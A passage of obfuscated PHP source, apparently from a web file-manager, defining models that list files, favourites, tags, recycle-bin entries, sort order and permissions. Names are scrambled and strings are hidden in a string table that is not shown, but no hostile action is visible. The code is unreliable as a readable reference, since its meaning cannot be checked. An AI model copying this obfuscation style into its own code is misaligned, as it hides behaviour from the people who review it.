$²ùîÁ¶¨ = array_field_key($²ùîÁ¶¨, $this->field); $Š´©–œ = $this->listData($ôºÄ¢ˆì); if (!$Š´©–œ || !$ôºÄ¢ˆì) { return !1; } $²ùîÁ¶¨ = array_merge($Š´©–œ, $²ùîÁ¶¨); $²ùîÁ¶¨[$ßÑ¥¶¾¬[88]] = time(); return Model($this->modelType)->set($ßÑ¥¶¾¬[475] . $ôºÄ¢ˆì, $²ùîÁ¶¨, $this->optionType); } public function remove($©Û€¿™‘) { if (!$©Û€¿™‘) { return !1; } return Model($this->modelType)->remove($_SERVER[«òÑğ][475] . $©Û€¿™‘, $this->optionType); } public function clear() { $•³‰›ß° =& $_SERVER[«òÑğ]; Model($this->modelType)->remove($•³‰›ß°[476], $this->optionType . $•³‰›ß°[477]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ò÷ü»é’, $§òÅÏ´å) { if (!$§òÅÏ´å) { return !1; } $ÜšèñÒì = $this->listData(); $ÜšèñÒì = array_to_keyvalue($ÜšèñÒì, $Ò÷ü»é’); return isset($ÜšèñÒì[$§òÅÏ´å]) ? $ÜšèñÒì[$§òÅÏ´å] : !1; } public function findByName($÷…Æ°éÜ) { return $this->findByKey($_SERVER[«òÑğ][32], $÷…Æ°éÜ); } protected function resetData($Éâ–»ç›) { $§ñöØîì =& $_SERVER[«òÑğ]; $Éâ–»ç› = is_array($Éâ–»ç›) ? $Éâ–»ç› : array(); $ªÍäç°¯ = array(); for ($ìÏ»¡ûü = 0; $ìÏ»¡ûü < count($Éâ–»ç›); $ìÏ»¡ûü++) { $ªÍäç°¯[$§ñöØîì[475] . $Éâ–»ç›[$ìÏ»¡ûü][$§ñöØîì[478]]] = $Éâ–»ç›[$ìÏ»¡ûü]; } return Model($this->modelType)->set($ªÍäç°¯, !1, $this->optionType); } private function getAutoName($ÕÖéÊá¢) { $íÃêÇ¾ = array_to_keyvalue($this->listData(), $_SERVER[«òÑğ][32]); if (!$íÃêÇ¾ || !isset($íÃêÇ¾[$ÕÖéÊá¢])) { return $ÕÖéÊá¢; } for ($óÔıæ˜Ê = 1; $óÔıæ˜Ê < count($íÃêÇ¾); $óÔıæ˜Ê++) { $½è´êÇ = $ÕÖéÊá¢ . "\50{$óÔıæ˜Ê}\x29"; if (!isset($íÃêÇ¾[$½è´êÇ])) { return $½è´êÇ; } } return $½è´êÇ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($²Éª½¬’ = false, $·¿Ù¾Â = '', $¸úåÓ©ä = false) { $ª·Ø Ş´ =& $_SERVER[«òÑğ]; $–Ñ¸®ç = $this->cacheGet($·¿Ù¾Â); $·‘ûø×û = $this->optionDefault($·¿Ù¾Â); $·‘ûø×û = is_array($·‘ûø×û) ? $·‘ûø×û : array(); if (is_array($–Ñ¸®ç)) { $–Ñ¸®ç = array_merge($·‘ûø×û, $–Ñ¸®ç); return $²Éª½¬’ ? isset($–Ñ¸®ç[$²Éª½¬’]) ? $–Ñ¸®ç[$²Éª½¬’] : null : $–Ñ¸®ç; } $¦ŞîÊ¸ä = $this->filterWhere(array($ª·Ø Ş´[33] => $·¿Ù¾Â)); $–Ñ¸®ç = $this->where($¦ŞîÊ¸ä)->select(); $–Ñ¸®ç = array_to_keyvalue($–Ñ¸®ç, $ª·Ø Ş´[97], $ª·Ø Ş´[453]); foreach ($–Ñ¸®ç as $ªø…”’† => $òúÏ£ŠÉ) { if ($¸úåÓ©ä || in_array($ªø…”’†, $this->jsonField)) { $–Ñ¸®ç[$ªø…”’†] = json_decode($òúÏ£ŠÉ, !0); } } $this->cacheSet($·¿Ù¾Â, $–Ñ¸®ç); $–Ñ¸®ç = array_merge($·‘ûø×û, $–Ñ¸®ç); return $²Éª½¬’ ? $–Ñ¸®ç[$²Éª½¬’] : $–Ñ¸®ç; } public function set($—òÙàˆ‘, $¾‘ÄÊ = false, $¥›ğÀŸà = '') { $ãîéŠ® =& $_SERVER[«òÑğ]; $this->cacheRemove($¥›ğÀŸà); $½Œœ›‰Ö = array(); $¨¹ÁôöÁ = is_array($—òÙàˆ‘) ? $—òÙàˆ‘ : array($—òÙàˆ‘ => $¾‘ÄÊ); foreach ($¨¹ÁôöÁ as $¬İ€¿“¸ => $“¿ØÖê) { if (is_array($“¿ØÖê)) { $“¿ØÖê = json_encode_force($“¿ØÖê); } $this->checkLength($“¿ØÖê, !1, $this->tableName . $ãîéŠ®[4] . $—òÙàˆ‘); $“¿ØÖê = self::textEncode($“¿ØÖê); $¨¹ÁôöÁ = array($ãîéŠ®[33] => $¥›ğÀŸà, $ãîéŠ®[97] => $¬İ€¿“¸, $ãîéŠ®[453] => $“¿ØÖê); $½Œœ›‰Ö[] = $this->filterWhere($¨¹ÁôöÁ); } if (!$½Œœ›‰Ö) { return !0; } $‹£ş¸›Ñ = $this->cacheKey($ãîéŠ®[479]); CacheLock::lock($‹£ş¸›Ñ); $©€ñÜ½½ = $this->addAll($½Œœ›‰Ö, array(), !0); CacheLock::unlock($‹£ş¸›Ñ); return $©€ñÜ½½; } protected function optionDefault($Ûìû­Ş = '') { return !1; } public function setDeep($¾Ş›”ï, $ËÂé‚±Ó = false, $âãÆÑÇÜ = '') { $¼è¯û¬¹ = explode($_SERVER[«òÑğ][10], $¾Ş›”ï); $×ºñŸÍ± = $this->get(); array_set_value($×ºñŸÍ±, $¾Ş›”ï, $ËÂé‚±Ó); $this->set($¼è¯û¬¹[0], $×ºñŸÍ±[$¼è¯û¬¹[0]], $âãÆÑÇÜ); } public function remove($“¢Òƒ¥é, $§ùüÉ¶ó = '') { $˜æÀñ»ç =& $_SERVER[«òÑğ]; $this->cacheRemove($§ùüÉ¶ó); $ìô´î± = $this->filterWhere(array($˜æÀñ»ç[97] => $“¢Òƒ¥é, $˜æÀñ»ç[33] => $§ùüÉ¶ó)); if (is_null($“¢Òƒ¥é)) { unset($ìô´î±[$˜æÀñ»ç[97]]); } return $this->where($ìô´î±)->delete(); } public function cacheSet($•ã»Çïƒ, $·ŞÈ©¹Ü = false) { return Cache::set($this->cacheKey($•ã»Çïƒ), $·ŞÈ©¹Ü); } public function cacheGet($¦â»à—¤) { return Cache::get($this->cacheKey($¦â»à—¤)); } public function cacheRemove($Ì÷ı°) { return Cache::remove($this->cacheKey($Ì÷ı°)); } protected function filterWhere($¢€‚ªğ·) { return $¢€‚ªğ·; } protected function cacheKey($Ä¿áÂ²Ñ) { return $Ä¿áÂ²Ñ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\x72\x63\x65"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\155\145" => "\x69\x6f\x5f\x73\157\x75\162\x63\145\137\155\x65\164\141", "\155\145\x74\141\x46\151\145\x6c\x64" => "\163\x6f\x75\162\143\x65\x49\x44"); protected $dataAuto = array(array("\155\157\144\x69\146\171\124\151\155\x65", "\x74\x69\x6d\x65", "\151\156\x73\x65\x72\x74", "\146\x75\156\x63\x74\151\x6f\156"), array("\143\x72\x65\x61\164\x65\124\x69\155\x65", "\164\151\x6d\x65", "\151\156\163\145\x72\x74", "\x66\165\156\143\x74\x69\157\156"), array("\x76\151\145\167\124\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\145\x72\164", "\x66\165\x6e\143\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ş‹­ğ°Ä) { return $this->listSource(array($_SERVER[«òÑğ][480] => $Ş‹­ğ°Ä)); } public function typeName($ŒéÚÔíè) { static $ÀŠÑÕ…ï = array(self::TYPE_SYSTEM => "\163\x79\x73\164\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\165\x70"); return $ÀŠÑÕ…ï[$ŒéÚÔíè . $_SERVER[«òÑğ][12]]; } public function sourceListInfo($°°¶™¸¿, $Ş’ •å = false) { $Ë¿¸«ğø =& $_SERVER[«òÑğ]; $°°¶™¸¿ = $°°¶™¸¿ ? $°°¶™¸¿ : array(); $°°¶™¸¿ = array_filter(array_unique($°°¶™¸¿)); if (!$°°¶™¸¿) { return array(); } $‹´íôŠá = $this->where(array($Ë¿¸«ğø[194] => array($Ë¿¸«ğø[7], $°°¶™¸¿)))->select(); $this->_listDataApply($‹´íôŠá, $Ş’ •å); return array_to_keyvalue($‹´íôŠá, $Ë¿¸«ğø[194]); } public function pathInfoFilter(&$çåø÷öä) { $ııäâ¦ñ =& $_SERVER[«òÑğ]; static $Êéı†‘² = false; static $¨Íâ¤äı = false; static $ôªëÈ‰ı = false; if (!$Êéı†‘²) { $ó†ã¢·İ = $ııäâ¦ñ[481]; $ó†ã¢·İ .= $ııäâ¦ñ[482]; $ó†ã¢·İ .= $ııäâ¦ñ[483]; $ëÙ¤·Ñ = $ııäâ¦ñ[484]; $¹Ûç»è = explode($ııäâ¦ñ[50], $ëÙ¤·Ñ); $Êéı†‘² = explode($ııäâ¦ñ[50], $ó†ã¢·İ); $¨Íâ¤äı = array(); foreach ($Êéı†‘² as $ú¬«¥·Ó) { if (in_array($ú¬«¥·Ó, $¹Ûç»è)) { continue; } $¨Íâ¤äı[] = $ú¬«¥·Ó; } $ôªëÈ‰ı = explode($ııäâ¦ñ[50], $ııäâ¦ñ[485]); } foreach ($ôªëÈ‰ı as $Â›òº»ø) { if (isset($çåø÷öä[$Â›òº»ø])) { $çåø÷öä[$Â›òº»ø] = intval($çåø÷öä[$Â›òº»ø]); } } $çåø÷öä[$ııäâ¦ñ[87]] = $ııäâ¦ñ[486] . $çåø÷öä[$ııäâ¦ñ[194]] . $ııäâ¦ñ[487]; $çåø÷öä[$ııäâ¦ñ[33]] = $çåø÷öä[$ııäâ¦ñ[488]] == 1 ? $ııäâ¦ñ[78] : $ııäâ¦ñ[233]; $çåø÷öä[$ııäâ¦ñ[191]] = $this->typeName($çåø÷öä[$ııäâ¦ñ[191]]); if ($çåø÷öä[$ııäâ¦ñ[488]] != 1) { $çåø÷öä[$ııäâ¦ñ[169]] = $çåø÷öä[$ııäâ¦ñ[489]]; unset($çåø÷öä[$ııäâ¦ñ[489]]); } $öº—°ßÊ = $Êéı†‘²; if (isset($çåø÷öä[$ııäâ¦ñ[490]]) && $çåø÷öä[$ııäâ¦ñ[490]][$ııäâ¦ñ[491]] == -1) { $öº—°ßÊ = $¨Íâ¤äı; } $çåø÷öä = array_field_key($çåø÷öä, $öº—°ßÊ); return $çåø÷öä; } public function listUserFav() { $Ü±Ğ’»× =& $_SERVER[«òÑğ]; $–Ö³ é = Model($Ü±Ğ’»×[492])->listData(); $´¢©¶¦ = array_filter_by_field($–Ö³ é, $Ü±Ğ’»×[33], $Ü±Ğ’»×[493]); $´¢©¶¦ = array_to_keyvalue($´¢©¶¦, $Ü±Ğ’»×[12], $Ü±Ğ’»×[87]); if ($´¢©¶¦) { $ƒ¸¡Æ¾Ã = $this->listSource(array($Ü±Ğ’»×[494] => array($Ü±Ğ’»×[495], $´¢©¶¦))); } $ƒ¸¡Æ¾Ã = array_to_keyvalue($ƒ¸¡Æ¾Ã[$Ü±Ğ’»×[448]], $Ü±Ğ’»×[194]); foreach ($–Ö³ é as &$»ÊŒÃŞö) { $»ÊŒÃŞö = array($Ü±Ğ’»×[496] => $»ÊŒÃŞö[$Ü±Ğ’»×[478]], $Ü±Ğ’»×[497] => $»ÊŒÃŞö[$Ü±Ğ’»×[32]], $Ü±Ğ’»×[498] => $»ÊŒÃŞö[$Ü±Ğ’»×[87]], $Ü±Ğ’»×[499] => $»ÊŒÃŞö[$Ü±Ğ’»×[33]], $Ü±Ğ’»×[500] => $»ÊŒÃŞö[$Ü±Ğ’»×[234]], $Ü±Ğ’»×[501] => $»ÊŒÃŞö[$Ü±Ğ’»×[88]]); if ($»ÊŒÃŞö[$Ü±Ğ’»×[33]] == $Ü±Ğ’»×[493] && $ƒ¸¡Æ¾Ã[$»ÊŒÃŞö[$Ü±Ğ’»×[87]]]) { $»ÊŒÃŞö[$Ü±Ğ’»×[90]] = $ƒ¸¡Æ¾Ã[$»ÊŒÃŞö[$Ü±Ğ’»×[87]]]; } } unset($»ÊŒÃŞö); return $–Ö³ é; } public function listUserTag($»‰Ú‡·û) { $¿®Ÿâ‰® =& $_SERVER[«òÑğ]; if ($»‰Ú‡·û && !is_array($»‰Ú‡·û)) { $»‰Ú‡·û = array($»‰Ú‡·û); } $·é“œ÷ = Model($¿®Ÿâ‰®[502])->listData(); $²êŞÂ = array(); $Ï‘¹È¸‘ = array(); foreach ($·é“œ÷ as $†¶¼ô™…) { $Ğõêüâ = $†¶¼ô™…[$¿®Ÿâ‰®[87]]; if (!$Ğõêüâ) { continue; } if (!isset($Ï‘¹È¸‘[$Ğõêüâ])) { $Ï‘¹È¸‘[$Ğõêüâ] = array(); } $Ï‘¹È¸‘[$Ğõêüâ][] = $†¶¼ô™…[$¿®Ÿâ‰®[503]]; $²êŞÂ[$†¶¼ô™…[$¿®Ÿâ‰®[87]]] = $†¶¼ô™…; } $ÓÙü¾½ = array(); $ß¯àúŒ = array(); $ô×˜¥Ó = array(); foreach ($Ï‘¹È¸‘ as $•ºÒ¤˜Ÿ => $Š·Ñ„„Ò) { $èğ³Ü¿Ì = !0; if (!$»‰Ú‡·û) { $ÓÙü¾½[] = $•ºÒ¤˜Ÿ; continue; } foreach ($»‰Ú‡·û as $ƒ†ˆµÊ¤) { if (!in_array($ƒ†ˆµÊ¤, $Š·Ñ„„Ò)) { $èğ³Ü¿Ì = !1; break; } } if (!$èğ³Ü¿Ì) { continue; } if (!is_numeric($•ºÒ¤˜Ÿ)) { $¦±òÙÙ = $²êŞÂ[$•ºÒ¤˜Ÿ]; $íŸ¨ÔĞî = array($¿®Ÿâ‰®[32] => $¦±òÙÙ[$¿®Ÿâ‰®[32]], $¿®Ÿâ‰®[87] => $¦±òÙÙ[$¿®Ÿâ‰®[87]], $¿®Ÿâ‰®[33] => $¦±òÙÙ[$¿®Ÿâ‰®[33]], $¿®Ÿâ‰®[90] => array($¿®Ÿâ‰®[504] => 1), $¿®Ÿâ‰®[235] => !0); if ($¦±òÙÙ[$¿®Ÿâ‰®[33]] == $¿®Ÿâ‰®[233]) { $ô×˜¥Ó[] = $íŸ¨ÔĞî; } if ($¦±òÙÙ[$¿®Ÿâ‰®[33]] == $¿®Ÿâ‰®[78]) { $ß¯àúŒ[] = $íŸ¨ÔĞî; } continue; } $ÓÙü¾½[] = $•ºÒ¤˜Ÿ; } if ($ÓÙü¾½) { $¤Ïº˜š» = $this->listSource(array($¿®Ÿâ‰®[494] => array($¿®Ÿâ‰®[495], $ÓÙü¾½))); } $¤Ïº˜š» = $¤Ïº˜š» ? $¤Ïº˜š» : array($¿®Ÿâ‰®[85] => array(), $¿®Ÿâ‰®[86] => array()); $¤Ïº˜š»[$¿®Ÿâ‰®[85]] = array_merge($¤Ïº˜š»[$¿®Ÿâ‰®[85]], $ß¯àúŒ); $¤Ïº˜š»[$¿®Ÿâ‰®[86]] = array_merge($¤Ïº˜š»[$¿®Ÿâ‰®[86]], $ô×˜¥Ó); if (isset($¤Ïº˜š»[$¿®Ÿâ‰®[445]]) && count($ÓÙü¾½) == $¤Ïº˜š»[$¿®Ÿâ‰®[445]][$¿®Ÿâ‰®[446]]) { return $¤Ïº˜š»; } $Ñä•š« = array(); $—¿š„…’ = array_to_keyvalue($¤Ïº˜š»[$¿®Ÿâ‰®[85]], $¿®Ÿâ‰®[12], $¿®Ÿâ‰®[194]); $âåÌ–œ = array_to_keyvalue($¤Ïº˜š»[$¿®Ÿâ‰®[86]], $¿®Ÿâ‰®[12], $¿®Ÿâ‰®[194]); $¹ğ¼”Ã = array_merge($âåÌ–œ, $—¿š„…’); foreach ($ÓÙü¾½ as $Ğõêüâ) { if (!in_array($Ğõêüâ, $¹ğ¼”Ã)) { $Ñä•š«[] = $Ğõêüâ; } } if ($Ñä•š«) { Model($¿®Ÿâ‰®[505])->removeBySource($Ñä•š«); } return $¤Ïº˜š»; } public function listUserRecycle() { $Ô¸Óåä” =& $_SERVER[«òÑğ]; $ß¢Ï„´ï = Model($Ô¸Óåä”[506])->listData(); if (!$ß¢Ï„´ï) { return array(); } $šß»‰î™ = array($Ô¸Óåä”[494] => array($Ô¸Óåä”[495], $ß¢Ï„´ï), $Ô¸Óåä”[507] => 1); return $this->listSource($šß»‰î™); } public function listSource($êû¡¾î«, $½®£Ÿ¼û = 3000, $ûÖë¶“£ = false) { $ş‘ö½Ü‹ =& $_SERVER[«òÑğ]; if (!isset($êû¡¾î«[$ş‘ö½Ü‹[508]])) { $êû¡¾î«[$ş‘ö½Ü‹[508]] = 0; } if (isset($êû¡¾î«[$ş‘ö½Ü‹[193]]) && $êû¡¾î«[$ş‘ö½Ü‹[193]] == $ş‘ö½Ü‹[231]) { $êû¡¾î«[$ş‘ö½Ü‹[489]] = array($ş‘ö½Ü‹[509], $ş‘ö½Ü‹[12]); } $®ÓĞıÒ = $ş‘ö½Ü‹[510]; $®¯­ŸÏ¾ = $this->field($®ÓĞıÒ)->_makeOrder()->where($êû¡¾î«)->selectPage($½®£Ÿ¼û); $this->_listPageCheck($®¯­ŸÏ¾, $®ÓĞıÒ, $êû¡¾î«); $this->_listDataApply($®¯­ŸÏ¾[$ş‘ö½Ü‹[448]], $ûÖë¶“£); $this->_listMake($®¯­ŸÏ¾); return $®¯­ŸÏ¾; } private function _listPageCheck(&$Üœı„­¸, $ùöõõ­³, $—äèãâ) { $Ø˜Ëí¸ =& $_SERVER[«òÑğ]; if (!is_array($Üœı„­¸[$Ø˜Ëí¸[445]])) { return; } $Ö×úòš = $Üœı„­¸[$Ø˜Ëí¸[445]]; if ($Ö×úòš[$Ø˜Ëí¸[447]] <= 1) { return; } if ($Ö×úòš[$Ø˜Ëí¸[446]] >= 100000) { return; } if (Model($Ø˜Ëí¸[511])->get($Ø˜Ëí¸[512]) != $Ø˜Ëí¸[513]) { return; } $ùöõõ­³ = str_replace(array($Ø˜Ëí¸[53], $Ø˜Ëí¸[420], $Ø˜Ëí¸[288]), $Ø˜Ëí¸[12], $ùöõõ­³); $ùöõõ­³ = $Ø˜Ëí¸[514] . str_replace($Ø˜Ëí¸[50], $Ø˜Ëí¸[515], $ùöõõ­³) . $Ø˜Ëí¸[516]; $å‚øÕµÑ = $Ø˜Ëí¸[517]; $å‚øÕµÑ = $å‚øÕµÑ . $Ø˜Ëí¸[518]; $Ô¾êÜ = $Ö×úòš[$Ø˜Ëí¸[442]] * ($Ö×úòš[$Ø˜Ëí¸[431]] - 1) . $Ø˜Ëí¸[50] . $Ö×úòš[$Ø˜Ëí¸[442]]; $©ò¬ ­ë = $this->_makeOrder(!0); $û¿ ½ó¨ = $Ø˜Ëí¸[514] . str_replace($Ø˜Ëí¸[50], $Ø˜Ëí¸[515], $©ò¬ ­ë[0]); if (strpos($û¿ ½ó¨, $Ø˜Ëí¸[519])) { $û¿ ½ó¨ = str_replace($Ø˜Ëí¸[519], $Ø˜Ëí¸[520], $û¿ ½ó¨); } else { $û¿ ½ó¨ .= $Ø˜Ëí¸[521] . $©ò¬ ­ë[1]; } $÷¦°öİß = array(); foreach ($—äèãâ as $ª¼¤ÎÊ¸ => $ìØìñÉ¹) { $÷¦°öİß[$Ø˜Ëí¸[514] . $ª¼¤ÎÊ¸] = $ìØìñÉ¹; } $this->alias($Ø˜Ëí¸[522])->field($ùöõõ­³)->limit($Ô¾êÜ)->order($û¿ ½ó¨); $í“ßÀÇ¸ = $this->join($å‚øÕµÑ)->where($÷¦°öİß)->select(); if ($í“ßÀÇ¸) { $Üœı„­¸[$Ø˜Ëí¸[448]] = $í“ßÀÇ¸; } } protected function _makeOrder($Ä©œÉš¦ = false) { $´ÓÆ¿šÖ =& $_SERVER[«òÑğ]; $¢—ö°ÁÀ = Model($´ÓÆ¿šÖ[523])->get($´ÓÆ¿šÖ[524]); $‹°ªŠ† = Model($´ÓÆ¿šÖ[523])->get($´ÓÆ¿šÖ[525]); $¸áäßÅ = array($´ÓÆ¿šÖ[526] => $´ÓÆ¿šÖ[527], $´ÓÆ¿šÖ[528] => $´ÓÆ¿šÖ[529]); $°¶İÖôÓ = array($´ÓÆ¿šÖ[32] => $´ÓÆ¿šÖ[32], $´ÓÆ¿šÖ[79] => $´ÓÆ¿šÖ[79], $´ÓÆ¿šÖ[169] => $´ÓÆ¿šÖ[489], $´ÓÆ¿šÖ[530] => $´ÓÆ¿šÖ[530], $´ÓÆ¿šÖ[531] => $´ÓÆ¿šÖ[532], $´ÓÆ¿šÖ[234] => $´ÓÆ¿šÖ[234], $´ÓÆ¿šÖ[88] => $´ÓÆ¿šÖ[88]); $ìÆÑäñö = Input::get($´ÓÆ¿šÖ[533], $´ÓÆ¿šÖ[7], $¢—ö°ÁÀ, array_keys($°¶İÖôÓ)); $×Œ—à„û = Input::get($´ÓÆ¿šÖ[534], $´ÓÆ¿šÖ[7], $‹°ªŠ†, array_keys($¸áäßÅ)); if (!in_array($ìÆÑäñö, array_keys($°¶İÖôÓ))) { $ìÆÑäñö = $´ÓÆ¿šÖ[32]; } if (!in_array($×Œ—à„û, array_keys($¸áäßÅ))) { $ìÆÑäñö = $´ÓÆ¿šÖ[526]; } if ($ìÆÑäñö == $´ÓÆ¿šÖ[32]) { } $ò¸âèú™ = $´ÓÆ¿šÖ[535] . $°¶İÖôÓ[$ìÆÑäñö] . $´ÓÆ¿šÖ[53] . $¸áäßÅ[$×Œ—à„û]; $ò¸âèú™ = rtrim(trim($ò¸âèú™), $´ÓÆ¿šÖ[50]); if ($Ä©œÉš¦) { return array($ò¸âèú™, $¸áäßÅ[$×Œ—à„û]); } return $this->order($ò¸âèú™); } protected function _listDataApplyItem($¦îæ…õÏ, $­õ“©£‘ = false) { $ÛÕâ§æÆ = array($¦îæ…õÏ); $this->_listDataApply($ÛÕâ§æÆ, $­õ“©£‘); return $ÛÕâ§æÆ[0]; } protected function _listDataApply(&$àâ½İÒ, $õÅë¥„ = false) { $Ù’ú† =& $_SERVER[«òÑğ]; if (!$àâ½İÒ) { $àâ½İÒ = array(); return; } $©äÕ ¤Ò = array_to_keyvalue($àâ½İÒ, $Ù’ú†[12], $Ù’ú†[194]); $©äÕ ¤Ò = array_unique($©äÕ ¤Ò); $this->_listSourceCache($àâ½İÒ); if (!$õÅë¥„) { $this->_listAppendMeta($àâ½İÒ, $©äÕ ¤Ò); $this->_listAppendFileMeta($àâ½İÒ, $©äÕ ¤Ò); $this->_listAppendChildren($àâ½İÒ, $©äÕ ¤Ò); } $this->_listAppendPath($àâ½İÒ); $this->_listAppendAuth($àâ½İÒ); $this->_listAppendSourceInfo($àâ½İÒ, $©äÕ ¤Ò); $this->_listAppendUser($àâ½İÒ); $this->_listFilterInfo($àâ½İÒ, $õÅë¥„); $this->_listAppendAuthSecret($àâ½İÒ); } protected function _listSourceCache($Â†›†) { $¦·ÅáÄƒ =& $_SERVER[«òÑğ]; foreach ($Â†›† as $ÅÂÁ™³È) { self::$cacheSourceInfo[$¦·ÅáÄƒ[536] . $ÅÂÁ™³È[$¦·ÅáÄƒ[194]]] = $ÅÂÁ™³È; } } protected function _listFilterInfo(&$Íñ÷Ä‹Ó, $˜Á¦ùŒÅ = false) { $”ŸåÂ =& $_SERVER[«òÑğ]; foreach ($Íñ÷Ä‹Ó as &$Ç¦õ¤–Ï) { $Ç¦õ¤–Ï = $this->pathInfoFilter($Ç¦õ¤–Ï); self::$cachePathInfo[$”ŸåÂ[537] . intval($˜Á¦ùŒÅ) . $”ŸåÂ[465] . $Ç¦õ¤–Ï[$”ŸåÂ[194]]] = $Ç¦õ¤–Ï; } unset($Ç¦õ¤–Ï); } protected function _listMake(&$œÑÕ½İÕ) { $µûä›¸ç =& $_SERVER[«òÑğ]; $œÑÕ½İÕ[$µûä›¸ç[85]] = array(); $œÑÕ½İÕ[$µûä›¸ç[86]] = array(); foreach ($œÑÕ½İÕ[$µûä›¸ç[448]] as $†¼œß—Ø) { $ëµä®Ú = $†¼œß—Ø[$µûä›¸ç[488]] == 1 ? $µûä›¸ç[85] : $µûä›¸ç[86]; $œÑÕ½İÕ[$ëµä®Ú][] = $†¼œß—Ø; } unset($œÑÕ½İÕ[$µûä›¸ç[448]]); } protected function _listAppendMeta(&$ÖÊ‚”Š‹, $“¦ó«åĞ) { $ÇìùÆÁ¾ =& $_SERVER[«òÑğ]; $ö‘‚›•† = array($ÇìùÆÁ¾[494] => array($ÇìùÆÁ¾[495], $“¦ó«åĞ)); $ÂÈ»»â = Model($ÇìùÆÁ¾[538])->field($ÇìùÆÁ¾[539])->where($ö‘‚›•†)->select(); if (!$ÂÈ»»â) { return; } $¯®ŠúÕÌ = array($ÇìùÆÁ¾[540], $ÇìùÆÁ¾[541], $ÇìùÆÁ¾[520]); $¥‚ÜÒë² = array(); foreach ($ÂÈ»»â as $Ş•İÅãí) { if (!isset($¥‚ÜÒë²[$Ş•İÅãí[$ÇìùÆÁ¾[194]]])) { $¥‚ÜÒë²[$Ş•İÅãí[$ÇìùÆÁ¾[194]]] = array(); } if (in_array($Ş•İÅãí[$ÇìùÆÁ¾[97]], $¯®ŠúÕÌ)) { continue; } if ($Ş•İÅãí[$ÇìùÆÁ¾[97]] == $ÇìùÆÁ¾[542]) { $Ş•İÅãí[$ÇìùÆÁ¾[453]] = $ÇìùÆÁ¾[543]; } $¥‚ÜÒë²[$Ş•İÅãí[$ÇìùÆÁ¾[194]]][$Ş•İÅãí[$ÇìùÆÁ¾[97]]] = $Ş•İÅãí[$ÇìùÆÁ¾[453]]; } foreach ($ÖÊ‚”Š‹ as &$ÄÎ¤Ã–â) { $ÄÎ¤Ã–â[$ÇìùÆÁ¾[544]] = !1; if (isset($¥‚ÜÒë²[$ÄÎ¤Ã–â[$ÇìùÆÁ¾[194]]])) { $ÄÎ¤Ã–â[$ÇìùÆÁ¾[544]] = $¥‚ÜÒë²[$ÄÎ¤Ã–â[$ÇìùÆÁ¾[194]]]; } if ($this->fileIsLock($ÄÎ¤Ã–â) && $ÄÎ¤Ã–â[$ÇìùÆÁ¾[490]]) { $Øí¶û¶Å = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÄÎ¤Ã–â[$ÇìùÆÁ¾[490]][$ÇìùÆÁ¾[491]] = AuthModel::authDisable($ÄÎ¤Ã–â[$ÇìùÆÁ¾[490]][$ÇìùÆÁ¾[491]], $Øí¶û¶Å); $ÄÎ¤Ã–â[$ÇìùÆÁ¾[490]][$ÇìùÆÁ¾[545]][$ÇìùÆÁ¾[490]] = $ÄÎ¤Ã–â[$ÇìùÆÁ¾[490]][$ÇìùÆÁ¾[491]]; } } unset($ÄÎ¤Ã–â); } protected function _listAppendFileMeta(&$–Ö·¥„Ü, $  ô•ª) { $í˜æÌ† =& $_SERVER[«òÑğ]; $®Ã§ßèà = array_to_keyvalue($–Ö·¥„Ü, $í˜æÌ†[12], $í˜æÌ†[546]); $®Ã§ßèà = array_filter(array_unique($®Ã§ßèà)); if (!$®Ã§ßèà) { return; } $ã÷óœíô = array($í˜æÌ†[547] => array($í˜æÌ†[495], $®Ã§ßèà)); $ÔéÌÚ’œ = $í˜æÌ†[548]; $É­»°ø = Model($í˜æÌ†[549])->field($ÔéÌÚ’œ)->where($ã÷óœíô)->select(); $É­»°ø = array_to_keyvalue($É­»°ø, $í˜æÌ†[546]); $ÎãÔÈ§© = Model($í˜æÌ†[550])->field($í˜æÌ†[551])->where($ã÷óœíô)->select(); $ÎãÔÈ§© = $ÎãÔÈ§© ? $ÎãÔÈ§© : array(); $Í‚ÇŸ‚Ç = array(); foreach ($ÎãÔÈ§© as $››øúáë) { if (!isset($Í‚ÇŸ‚Ç[$››øúáë[$í˜æÌ†[546]]])) { $Í‚ÇŸ‚Ç[$››øúáë[$í˜æÌ†[546]]] = array(); } $Í‚ÇŸ‚Ç[$››øúáë[$í˜æÌ†[546]]][$››øúáë[$í˜æÌ†[97]]] = $››øúáë[$í˜æÌ†[453]]; } foreach ($–Ö·¥„Ü as &$Õ¹¾Å») { $ ĞôãŒ = $Õ¹¾Å»[$í˜æÌ†[546]]; if (!$ ĞôãŒ || !is_array($É­»°ø[$ ĞôãŒ])) { continue; } $ÙùÅÛ¢® = $É­»°ø[$ ĞôãŒ]; $ÙùÅÛ¢®[$í˜æÌ†[79]] = $Õ¹¾Å»[$í˜æÌ†[79]]; $ÙùÅÛ¢®[$í˜æÌ†[32]] = $Õ¹¾Å»[$í˜æÌ†[32]]; if (!$ÙùÅÛ¢®[$í˜æÌ†[552]]) { Model($í˜æÌ†[549])->fileMd5Check($ÙùÅÛ¢®); } if (!isset(self::$cacheFileInfo[$í˜æÌ†[553] . $ ĞôãŒ])) { self::$cacheFileInfo[$í˜æÌ†[553] . $ ĞôãŒ] = array_merge(array(), $ÙùÅÛ¢®); } unset($É­»°ø[$ ĞôãŒ][$í˜æÌ†[87]]); $º½¸Éè = isset($Í‚ÇŸ‚Ç[$ ĞôãŒ]) && is_array($Í‚ÇŸ‚Ç[$ ĞôãŒ]) ? $Í‚ÇŸ‚Ç[$ ĞôãŒ] : array(); $Õ¹¾Å»[$í˜æÌ†[170]] = array_merge($º½¸Éè, $É­»°ø[$ ĞôãŒ]); if (isset($Õ¹¾Å»[$í˜æÌ†[170]][$í˜æÌ†[185]])) { $Õ¹¾Å»[$í˜æÌ†[185]] = json_decode($Õ¹¾Å»[$í˜æÌ†[170]][$í˜æÌ†[185]], !0); unset($Õ¹¾Å»[$í˜æÌ†[170]][$í˜æÌ†[185]]); 